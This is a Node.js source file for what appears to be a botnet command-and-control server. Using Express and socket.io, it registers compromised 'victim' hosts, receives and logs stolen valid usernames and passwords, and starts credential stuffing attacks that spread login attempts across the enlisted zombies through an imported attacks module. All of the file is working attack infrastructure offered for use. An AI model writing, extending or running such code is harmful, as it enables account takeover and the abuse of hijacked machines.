const path = require("path");


const runCredentialStuffingAttack = require('./attacks').runCredentialStuffingAttack;

let zombies = [];
let credentials = [];


const initialize = async(port, express) => {
    const app = express();
    const http = require("http");
    const server = http.createServer(app);
    const io = require("socket.io")(server);
    const uiPath = path.join(__dirname, "../ui");

    return new Promise((resolve, reject) => {
        app.use(express.json());
        app.use(
            "/command.js",
            express.static(path.join(uiPath, "/command.js"))
        );

        app.get("/command", function(req, res) {
            res.sendFile(path.join(uiPath, "/command.html"));
        });

        app.use(express.json());
        app.post("/new-victim", function(req, res) {
            const hostname = req.body.host;
            zombies.push(hostname);
            io.emit("new-victim", hostname);
            console.log(`New victim connected, Host: ${hostname}`);
            res.sendStatus(200);
        });

        app.post("/valid-credentials", function(req, res) {
            const { username, password } = req.body;
            credentials.push({ username, password });
            io.emit("credentials", { username, password });
            console.log(`Recieved valid credentials ${username} ${password}`);
            res.sendStatus(200);
        })

        app.post("/run-attack", function(req, res) {
            let { host, endpoint, delay, usernames, passwords } = req.body;
            console.log(
                "PREPAIRING ATTACK ",
                host,
                endpoint,
                delay,
                usernames,
                passwords,
                zombies
            );
            if (zombies.length < 1) {
                res.sendStatus(500);
            } else {
                res.sendStatus(200);
                runCredentialStuffingAttack(req.body, zombies);
            }
        });

        io.on("connection", (socket) => {
            console.log("command and control socket connection established");
        });

        server.listen(port, async() => {
            console.log(`Command and control running on port ${port}`);
            resolve();
        });
    });
};

module.exports = {
    initialize
}